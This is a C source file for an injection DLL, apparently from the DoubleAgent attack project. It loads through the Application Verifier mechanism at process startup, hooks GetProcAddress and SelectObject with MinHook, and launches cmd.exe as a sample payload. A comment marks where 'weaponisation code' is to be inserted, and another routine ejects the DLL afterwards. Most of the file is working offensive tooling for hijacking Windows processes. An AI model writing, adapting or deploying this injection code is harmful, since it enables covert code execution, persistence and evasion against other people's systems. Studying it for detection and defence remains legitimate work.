/* Includes ******************************************************************/
#include <Windows.h>
#include "Status.h"
#include "Process.h"
#include "VerifierDll.h"
#include <MinHook.h>

//Global Variables
HINSTANCE DllHandle;
BOOL Executed = FALSE;
//hooks to functions
typedef int (WINAPI* GetProcAddress2)(HMODULE hModule, LPCSTR lpProcName);
typedef int (WINAPI* SelectObject2)(HDC hdc, HGDIOBJ h);
GetProcAddress2 GPA2 = NULL;
SelectObject2 SO2 = NULL;

int WINAPI GPAHookMain(HMODULE hModule, LPCSTR lpProcName)
{
	MainHookExecute();
	return GPA2(hModule, lpProcName);
}
int WINAPI SOHookMain(HDC hdc, HGDIOBJ h)
{
	MainHookExecute();
	return SO2(hdc, h);
}



static int MainHookExecute()
{
	if (!Executed)
	{
		Executed = TRUE;

		/*
		 * New Sample Code - Launch cmd.exe
		 * Uses hooks to execute code and hooks when process is booted
		 * The sample code below uses kernel32.dll and therefore may cause undefined behavior on some operating systems
		 * This specific code has been tested and found working on Windows 10 x64 but fails on Windows 7 x64
		 */

		/*
		**************************************************************************
		Enter Your weaponisation Code Here
		Remarks: DoubleAgentDll is loaded extremely early during the process boot, while the process is still not completely initialized
			 This may pose limitations regarding what libraries may be used from main_DllMainProcessAttach
			 The only library that is guaranteed to work properly and may be used safely is ntdll.dll
			 Other libraries (e.g. kernel32.dll) may or may not work and should preferably be avoided

			 One solution for using additional libraries except from ntdll.dll would be to delay code execution and avoid "heavy" operations from main_DllMainProcessAttach
			 This can be done in a verity of ways, including setting a hook on the end of the process boot and only then executing the "heavy" code
		**************************************************************************
		*/


		PROCESS_Create(L"C:\\Windows\\System32\\cmd.exe");
	}
	return;
}

/* Function Declarations *****************************************************/
/*
 * The event handler for DLL attach events
 */
static BOOL main_DllMainProcessAttach(VOID);
/*
 * The event handler for DLL detach events
 */
static BOOL main_DllMainProcessDetach(VOID);

/* Function Definitions ******************************************************/
BOOL WINAPI DllMain(IN HINSTANCE hInstDLL, IN SIZE_T nReason, IN PVOID pvReserved)
{
	UNREFERENCED_PARAMETER(hInstDLL);

	/* Process Attach */
	if (VERIFIERDLL_DLL_PROCESS_VERIFIER == nReason)
	{
		return VERIFIERDLL_DllMainProcessVerifier(pvReserved);
	}

	else if (DLL_PROCESS_ATTACH == nReason)
	{
		return main_DllMainProcessAttach();
	}

	/* Process Detach */
	else if (DLL_PROCESS_DETACH == nReason)
	{
		return main_DllMainProcessDetach();
	}

	/* Thread Attach\Detach */
	else
	{
		return TRUE;
	}
}

static BOOL main_DllMainProcessAttach(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;

	/*
	 * Sample Code - Launch cmd.exe
	 * As stated above, calling non ntdll.dll libraries may or may not work
	 * The sample code below uses kernel32.dll and therefore may cause undefined behavior on some operating systems
	 * This specific code has been tested and found working on Windows 10 x64 but fails on Windows 7 x64
	 */

	 //eStatus = PROCESS_Create(L"C:\\Windows\\System32\\cmd.exe");
	 //if (FALSE == DOUBLEAGENT_SUCCESS(eStatus))
	 //{
	 //	goto lbl_cleanup;
	 //}
	MH_STATUS HookStatus = MH_Initialize();

	if (HookStatus != MH_OK && HookStatus != MH_ERROR_ALREADY_INITIALIZED)
	{
		ShutdownAndCleanUP();
	}
	MH_CreateHook(&GetProcAddress, &GPAHookMain, (LPVOID*)&GPA2);
	MH_CreateHook(&SelectObject, &SOHookMain, (LPVOID*)&SO2);
	MH_EnableHook(&GetProcAddress);
	MH_EnableHook(&SelectObject);


	 /* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

	//lbl_cleanup:
	/* Returns status */
	return FALSE != DOUBLEAGENT_SUCCESS(eStatus);
}

static BOOL main_DllMainProcessDetach(VOID)
{
	DOUBLEAGENT_STATUS eStatus = DOUBLEAGENT_STATUS_INVALID_VALUE;
	ShutdownAndCleanUP();
	/* Succeeded */
	DOUBLEAGENT_SET(eStatus, DOUBLEAGENT_STATUS_SUCCESS);

	/* Returns status */
	return FALSE != DOUBLEAGENT_SUCCESS(eStatus);

}

DWORD __stdcall EjectThread(LPVOID lpParameter) {
	Sleep(100);
	FreeLibraryAndExitThread(DllHandle, 0);
	return 0;
}

static int ShutdownAndCleanUP()
{
	MH_DisableHook(MH_ALL_HOOKS);
	MH_Uninitialize();
	CreateThread(0, 0, EjectThread, 0, 0, 0);
	return 0;
}